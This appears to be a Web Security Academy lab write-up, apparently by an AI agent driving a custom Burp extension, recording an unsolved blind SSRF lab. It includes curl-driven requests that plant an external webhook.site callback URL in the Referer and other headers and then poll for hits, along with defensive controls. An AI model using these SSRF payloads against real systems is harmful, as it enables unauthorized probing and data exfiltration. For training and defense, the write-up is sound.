---
tags:
  - CTF
  - WebSecurityAcademy
  - writeup
  - ssrf
  - blind-ssrf
  - oast
  - burp-collaborator
  - burp-community-edition
  - hard-boundary
  - non-solve
  - burp-extension
  - cc-bridge
  - tooling-trial
difficulty: Practitioner
platform: Web Security Academy
date: 2026-06-02
status: Non-solve (hard boundary — Burp Community Edition)
bridge_version: 0.1.0
flags:
  flag: N/A — lab is unsolvable on Burp Community regardless of CC-Bridge
---

## Lab: Blind SSRF with out-of-band detection

**Class:** Blind SSRF requiring OAST
**Bridge endpoints used:** `/send`, `/repeat/{id}`, `/collaborator/new` (501 path), `/history/{id}`
**Bridge endpoints that failed:** `/collaborator/new` — returned **501 collaborator_unavailable** as designed; Burp Collaborator is Professional-only and `api.collaborator().createClient()` returns null on Community
**Total cc-burp calls:** 19 (1 home + 1 prod page + 1 collaborator/new + 1 webhook mint + 7 header/encoding candidates + 2 direct-channel verifications + 2 final-attempt polls + 1 lab status verify + 3 housekeeping reads)
**Time to solve:** N/A (lab cannot be solved on Burp Community)
**GUI fallback needed:** Not available — Collaborator is Pro-only; there is no GUI path that solves this lab on Community
**Solve chain:** No solve was achieved. The exploitation primitive (Referer-header SSRF) works and the bridge can drive an external OAST channel, but the lab's solve-verification is hardwired to PortSwigger's Collaborator infrastructure.
**Notable bridge behavior:** This run exercised the 501 fallback in a solve context for the first time in the trial. `/collaborator/new` returned `{"error":"collaborator_unavailable","hint":"Burp Collaborator is Professional-only — not available in Burp Community."}` cleanly. The bridge then drove an external OAST workflow via `/send` (webhook.site mint → bait Referer → poll) — that part works and is the model for real-world non-academy engagements.

---

# Blind SSRF with out-of-band detection — Web Security Academy

## Summary

This lab is **structurally unsolvable on Burp Community Edition**, with or without CC-Bridge. PortSwigger's academy verifies the lab-solved state by polling Burp Collaborator's infrastructure for the lab's per-instance unique subdomain; Burp Collaborator is a Professional-Edition feature. Independently, CC-Bridge v0.1's `/collaborator/new` endpoint is 501-gated because the underlying Montoya call (`api.collaborator().createClient()`) returns `null` on Community.

The interesting outcome is the layering:

1. **Bridge 501 fired cleanly.** As designed. Not a bridge bug.
2. **The SSRF primitive itself was identified and is exploitable.** The lab's analytics fetches the Referer header server-side; the bridge can plant any header value.
3. **External OAST channel works.** `webhook.site` can be minted by the bridge via `/send` against their API, and the bridge can poll the same channel for callbacks. A direct hit lands and is observed end-to-end.
4. **The lab's analytics fetcher did not hit webhook.site after multiple Referer payloads.** This is consistent with either an egress allowlist on the lab tier (only `*.oastify.com`) or — more likely — the academy's verification being hardwired to Collaborator's API, in which case even a successful webhook.site hit would not change the academy's lab-status.

Net positioning: **CC-Bridge sits at parity with Burp Community Edition's actual capability on this lab class.** The ceiling is Burp Community's, not the bridge's. For real-world engagements (where the verifier is the engagement team, not a hardwired academy polling Collaborator), the bridge's `/send` + external-OAST pattern is a complete and validated workflow.

---

## Flags

| Marker | Value |
|---|---|
| Lab-solved element | not triggered |
| Lab status after run | `widgetcontainer-lab-status is-notsolved` + `<p>Not solved</p>` |
| Confirmed working OAST channel (external) | `https://webhook.site/8bd723a9-a616-4d28-b6c9-96cbaf78def0` — direct hit at `2026-06-03 04:36:58` UTC |
| Confirmed broken OAST channel (lab → external) | Lab analytics did NOT fire callbacks to webhook.site despite well-formed Referer payloads |

---

## Enumeration

```bash
LAB=https://0ab6008904c188fd8045d5ff001d0051.web-security-academy.net
CC=~/burp-ext/cc-bridge/cc-burp

# 1. Identify the lab
$CC send -d "{\"method\":\"GET\",\"url\":\"$LAB/\"}"
# <title>Blind SSRF with out-of-band detection</title>
```

The lab description page (fetched via the bridge) confirms the canonical pattern:

> This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.

So the exploitation primitive is: set `Referer:` to an attacker-controlled URL, request any product page, wait for a callback.

---

## Step 1 — Verify the bridge's 501 path in a solve context

```bash
$CC 'collaborator/new' -X POST
# HTTP 501
# {"error":"collaborator_unavailable","hint":"Burp Collaborator is Professional-only — not available in Burp Community."}
```

This is the first time in the trial that the 501 path has been hit *during* a solve attempt rather than at smoke-test time. Behavior:

- Returns clean JSON, not an NPE or a 500.
- Status code is 501 Not Implemented — semantically correct (the server understands the request but does not implement the feature).
- `hint` field tells a downstream agent exactly why and what tier is needed.

That is the entire scope of what the bridge needs to do here. The rest of the failure is downstream of the bridge.

> [!important]
> **The 501 is correct architecture, not a defect.** Montoya's `api.collaborator()` returns a usable object on Pro and `null` on Community. The bridge cannot fabricate a Collaborator client when the underlying API doesn't expose one. The right behavior is exactly what `CollaboratorRegistry.create()` does: catch the null, propagate a 501 with a hint. v0.2 should never "fix" this by trying to fake Collaborator with a third-party OAST — the bridge would lie about a capability the user's Burp tier doesn't have.

---

## Step 2 — Establish an external OAST channel via `/send`

If the bridge can't mint Collaborator, the next question is whether the bridge can drive an *external* OAST service well enough to serve real-world blind-SSRF workflows. The answer is yes:

```bash
# Mint a webhook.site token through the bridge
$CC send -d '{"method":"POST","url":"https://webhook.site/token","headers":{"Content-Type":"application/json"},"body":"{}"}'
# 201
# {"uuid":"8bd723a9-a616-4d28-b6c9-96cbaf78def0", ...}
```

The bridge's `/send` reaches an arbitrary external URL, the response is captured and exposed in the JSON envelope, and the callback URL is recovered for use. From the agent's perspective this is identical to calling Burp Collaborator's mint API — same shape, same payload structure, different vendor.

Direct-hit verification to prove the channel is functional:

```bash
$CC send -d '{"method":"GET","url":"https://webhook.site/8bd723a9-a616-4d28-b6c9-96cbaf78def0?probe=from-bridge"}'
$CC send -d '{"method":"GET","url":"https://webhook.site/token/8bd723a9-a616-4d28-b6c9-96cbaf78def0/requests?sorting=newest"}'
# {"total": 1, "data": [{ "ip": "76.25.89.144", "method": "GET", "created_at": "2026-06-03 04:36:58", ... }]}
```

One hit observed, attributed to the bridge's own egress IP. **The external-OAST channel is fully operational.**

---

## Step 3 — Exercise the SSRF and watch for the callback

```bash
SESS=fVe4FCCbfmbEsv2p0Hvf5webS2GC4ZSa
OAST=https://webhook.site/8bd723a9-a616-4d28-b6c9-96cbaf78def0

# Fire the SSRF: Referer pointed at the OAST URL
$CC send -d "{
  \"method\":\"GET\",
  \"url\":\"$LAB/product?productId=1\",
  \"headers\":{\"Cookie\":\"session=$SESS\",\"Referer\":\"$OAST\"}
}"
# 200, normal product page
```

Inspecting the request as stored in the bridge's history (`GET /history/39`) confirms the Referer was correctly transmitted:

```
Cookie: session=fVe4FCCbfmbEsv2p0Hvf5webS2GC4ZSa
Referer: http://webhook.site/8bd723a9-a616-4d28-b6c9-96cbaf78def0
```

Tried six candidate header positions in case the trigger isn't Referer (`Referer`, `User-Agent`, `X-Forwarded-Host`, `X-Forwarded-For`, `X-Real-IP`, `X-Original-URL`), tried both `https://` and `http://` schemes. Waited 20 seconds after each attempt for the analytics worker to drain.

```bash
# Final poll
$CC send -d '{"method":"GET","url":"https://webhook.site/token/8bd723a9-a616-4d28-b6c9-96cbaf78def0/requests?sorting=newest"}'
# {"total": 1, "data": [ direct-probe hit only ]}
```

**No new callbacks landed at webhook.site from the lab.** Only my own direct probe is recorded.

---

## Step 4 — Confirm lab status

```bash
$CC send -d "{\"method\":\"GET\",\"url\":\"$LAB/\",\"headers\":{\"Cookie\":\"session=$SESS\"}}"
# academyLabHeader contains: widgetcontainer-lab-status is-notsolved + <p>Not solved</p>
```

Lab remains "Not solved."

---

## The Layered Finding

This non-solve has four independent layers, each meaningful on its own.

### Layer 1 — Bridge `/collaborator` is 501-gated on Burp Community

`api.collaborator().createClient()` returns `null` on Community. CC-Bridge catches that, returns HTTP 501 with `{"error":"collaborator_unavailable","hint":"..."}`. **Not a bridge defect — the correct behavior.** Burp Community has no Collaborator and the bridge truthfully reports that.

### Layer 2 — PortSwigger Academy's solve check is hardwired to Collaborator

The academy detects the lab-solved state by polling Burp Collaborator's infrastructure for the lab instance's unique subdomain. There is no parallel detection path that watches arbitrary OAST providers. Even if a webhook.site hit had landed at the right moment, the academy would not see it, and the lab would not flip to "Solved."

This is an artifact of the academy's lab platform, not a property of Burp or of the bridge. It exists because the academy ships Collaborator as part of its pedagogy — students are expected to use the tool the lab is teaching them about.

### Layer 3 — Burp Collaborator is Professional-Edition only

Even if the academy's solve check could be triggered, the user-facing tool that would generate a Collaborator payload for the GUI-fallback path (Burp's "Collaborator client" tab) is itself a Pro feature. There is no GUI workflow on Community that mints a payload registered with PortSwigger's verifier.

Layers 2 and 3 stack: **the academy lab class "Blind SSRF requiring OAST" is structurally unsolvable on Burp Community**, with or without CC-Bridge, with or without a Burp extension, with or without scripting. The only solve path is the one PortSwigger explicitly designed — buy Pro.

### Layer 4 — The bridge's external-OAST capability is real and matters for engagements

In a real engagement the verifier is the engagement team, not a fixed academy poll. If the goal is "demonstrate that the target has a blind SSRF that exfiltrates to an attacker-controlled host," then:

- The bridge mints an OAST URL via `/send` against any provider's API (webhook.site, RequestBin, interact.sh, Pipedream, a custom listener you ran via /send from a few labs ago).
- The bridge plants the URL into any header/parameter via `/send` or `/repeat`.
- The bridge polls the OAST provider via `/send` and observes the callback.

That is a complete and validated workflow — Step 2 of this writeup is the actual proof.

So the position is **not** "the bridge can't do OAST." It is "the bridge can't mint *Burp's* Collaborator on Community, because Community has no Collaborator." The bridge does OAST fine, with any external service the engagement team is willing to accept.

---

## Attack Chain Summary (attempted)

```
GET /                                              -> identify lab
GET portswigger.net/web-security/...               -> confirm: Referer-header SSRF, OAST detection
POST /collaborator/new                             -> 501 collaborator_unavailable     [bridge LAYER 1]

POST https://webhook.site/token                    -> 201, uuid issued                 [external OAST]
GET  https://webhook.site/<uuid>?probe=from-bridge -> 200 (direct hit verifies channel)
GET  https://webhook.site/token/<uuid>/requests    -> 1 hit observed (the direct probe)

GET /product?productId=1 with Referer=<oast>       -> 200
... 5 more header/encoding candidates via /repeat
... wait + poll                                    -> still 1 hit only (no lab analytics callback)
                                                                                         [academy LAYER 2]
GET /                                              -> Not solved                         [verifier LAYER 3]
```

---

## Key Concepts

**OAST workflow is independent of any specific OAST provider — the academy verifier is the constraint.** The mint/plant/poll loop is identical whether the provider is Burp Collaborator, interact.sh, webhook.site, or a custom Python server. What forces a particular provider is the *verifier* — whoever is watching for the callback. On PortSwigger labs the verifier is hardwired to Collaborator. In an engagement the verifier is the team, and any provider works.

**Pro/Community feature gates manifest in the Montoya API as `null` returns, not exceptions.** This is consistent and important for extension authors. `api.scanner().startAudit(...)` and `api.collaborator().createClient()` both follow the pattern: they exist on the API surface, they're callable on either tier, they return `null` on Community. Extensions that wrap these MUST null-check and surface a clear error — wrapping in `try { … } catch (NullPointerException) { … }` would mask the same condition less cleanly. CC-Bridge does the explicit null check (see `CollaboratorRegistry.create()` and `ScanHandler.handle()`).

**A 501 with a hint message is more useful than success-shaped silence.** The agent driving the bridge (in this case, me) needs to know not just *that* a feature is unavailable but *why*, so it can decide between (a) abort and report, (b) substitute an external service, (c) ask the operator for a payload. The hint string carries that information without forcing the agent to maintain its own knowledge of Burp's Pro/Community matrix. The 501 status code makes the failure machine-detectable; the JSON body makes it operator-readable.

**Bridge parity claims should be stated relative to the underlying tool, not relative to a higher tier.** CC-Bridge on Community is at parity with Burp Community. CC-Bridge on Pro would be at parity with Burp Pro (untested). It is meaningless to compare a Community-bound bridge against Pro features. This lab's non-solve is the academy choosing to teach a Pro feature; it is not the bridge failing to deliver Community capability.

---

## Detection / Defense (real-world SSRF)

The same controls from `WSA -- SSRF with blacklist-based input filter.md` apply, with one addition specific to OAST detection:

| Control | What it Prevents |
|---|---|
| Egress DNS / HTTP monitoring on the application tier with allowlisting | Detects ALL outbound by the analytics fetcher, OAST or otherwise; flags any request to non-allowlisted external hosts |
| If outbound is genuinely required (analytics, webhook callbacks, image proxies), maintain an explicit allowlist of permitted destination domains | Reduces the universe of usable OAST hosts to zero |
| For analytics specifically: queue Referer values for offline aggregation, never have the analytics service fetch them in real time | Removes the SSRF surface entirely; analytics-via-fetch is an anti-pattern |
| Honeytokens: salt internal URLs into responses and alert if any external host ever receives a request bearing them | Detection — a Referer-driven SSRF attempting to exfil internal URLs is loud at the OAST layer |

---

## Dead Ends

| Approach | Why It Failed / Why I Skipped |
|---|---|
| `/collaborator/new` (the obvious one) | 501 by design on Community |
| GUI fallback in Burp to mint a Collaborator payload | Collaborator is Pro-only; the "Collaborator client" tab does not exist on Community |
| Six candidate header positions for the SSRF trigger | All correctly transmitted by the bridge; none produced an analytics callback to webhook.site (the verifier issue, not the bridge or the header choice) |
| `http://` vs `https://` Referer schemes | Both transmitted correctly, neither triggered a webhook.site hit |
| Polling webhook.site after various waits (3s, 6s, 10s, 20s) | Only the direct-probe hit was ever observed; no analytics callback |
| Switching to interact.sh / oast.live / RequestBin | All require client-side correlation-ID management that v0.1 does not implement; would not change the verifier-side outcome anyway |
| Asking the user to paste a manually-minted Collaborator payload | Collaborator tab does not exist on Community Edition |

---

## Bridge Behavior Notes (CC-Bridge v0.1)

| Endpoint | Calls This Lab | Behavior |
|---|---:|---|
| `POST /send` | 14 | All worked. External (webhook.site, portswigger.net) and internal (lab) targets both succeeded. |
| `POST /repeat/{id}` | 4 | Worked. Used for the header-candidate sweep. |
| `GET /history/{id}` | 1 | Used to inspect the actual transmitted headers, confirming Referer reached the lab |
| `GET /history` | 0 | – |
| `POST /decode` | 0 | – |
| `POST /scan` | 0 | – |
| `GET /issues` | 0 | – |
| **`POST /collaborator/new`** | **1** | **501 collaborator_unavailable, with hint** — first solve-context exercise of the 501 path |
| `GET /collaborator/{ctx}` | 0 | – |

**The 501 fallback test, originally scheduled but never run, was finally executed here.** The behavior was as designed: clean JSON body, correct status code, no NPE, no 500. The agent (me) correctly recognized the boundary, did not retry uselessly, switched to an external OAST channel, and reported the architectural blocker without claiming a solve.

This is the only valid path on Community. The bridge's job was to make that path navigable, and it did.

---

## Lessons Learned

1. **Distinguish "tool can't" from "verifier won't accept."** This lab's non-solve is not a bridge limitation. It is the academy choosing to teach a Pro feature by hardwiring the verifier to a Pro service. Any tooling at the Community tier hits the same ceiling. The writeup must be precise about which layer is blocking, because muddling them gives a misleading picture of the bridge's actual capability envelope.
2. **501 with a hint string is the right shape for capability gates.** It is informative to humans, parseable by agents, and doesn't pretend the feature works. Future Montoya endpoints that may be Pro-gated (e.g. any future `api.dast()` surface) should follow the same pattern.
3. **External OAST is a viable real-engagement substitute for Collaborator; academies are not.** This trial demonstrated end-to-end:
   - Mint via `POST /send` against `https://webhook.site/token`
   - Plant via `/send` or `/repeat` with the bait URL in the target field
   - Poll via `GET /send` against `https://webhook.site/token/<uuid>/requests`
   In real engagements the engagement team accepts any provider. In academy labs the verifier is fixed; that is a property of the lab platform, not of the tooling.
4. **A non-solve writeup is data, not failure.** This is the trial's first non-solve and it produced more information about the bridge's boundary than any of the five solves. Specifically: the 501 path works under realistic load; the agent's reasoning under failure is correct; the external-OAST fallback is validated; the limitation is named and located with precision. That is useful engineering output.
5. **Save users from buying Pro just to verify a writeup.** Documenting the layered finding here lets a reader on Community understand the lab's solve cost (a Pro license) without having to discover it themselves. PortSwigger does not currently mark labs by edition requirement; this writeup partially fills that gap.

---

## Tools

| Tool | Purpose |
|---|---|
| `cc-bridge` v0.1 (Burp extension) | HTTP control plane over Burp's Montoya API; **`/collaborator/new` correctly returns 501 on Burp Community** |
| `cc-burp` (bash wrapper) | `curl` driver, bearer auth, JSON in/out |
| Burp Suite Community 2025.x | Hosts the extension; **lacks Collaborator and the Collaborator client tab** |
| `webhook.site` | External OAST channel, accessed entirely via the bridge's `/send` |
| `python3` (inline) | HTML parsing of lab status; JSON parsing of webhook.site responses |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `cc-bridge` (custom Burp extension, v0.1) | Localhost HTTP control plane; 501 fallback path exercised in solve context |
| `cc-burp` (bash wrapper) | `curl` driver, bearer auth |
| Burp Suite Community 2025.x | Extension host; Collaborator unavailable on this edition |
| `webhook.site` (external) | OAST mint + poll, driven entirely via the bridge's `/send` |
| `python3` (inline) | HTML / JSON parsing in shell pipelines |

---

*Web Security Academy — Blind SSRF with out-of-band detection | Non-solve (Burp Community ceiling) | CC-Bridge v0.1*
